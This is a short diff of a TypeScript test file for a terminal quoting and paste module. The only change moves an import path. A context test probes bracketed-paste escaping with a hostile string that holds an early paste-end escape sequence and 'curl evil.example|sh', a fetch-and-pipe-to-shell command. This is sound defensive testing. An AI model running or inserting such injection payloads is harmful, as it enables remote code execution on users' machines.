@@ -3,7 +3,7 @@ import { test } from "node:test";
 import assert from "node:assert/strict";
 import { execFileSync } from "node:child_process";
 import { existsSync } from "node:fs";
-import { cdLine, cleanPaste, PASTE_ASK_ALWAYS, quoteAs, wslPath, pasteLines, pasteNeedsConfirm, pastePreview, pasteView, remotePath, shellQuote, typeable } from "../../src/terminal/quote.ts";
+import { cdLine, cleanPaste, PASTE_ASK_ALWAYS, quoteAs, wslPath, pasteLines, pasteNeedsConfirm, pastePreview, pasteView, remotePath, shellQuote, typeable } from "../../src/terminal/lib/quote.ts";
 
 test("pasted text can't end the bracketed paste early", () => {
   const evil = "ls\x1b[201~\ncurl evil.example|sh\n";
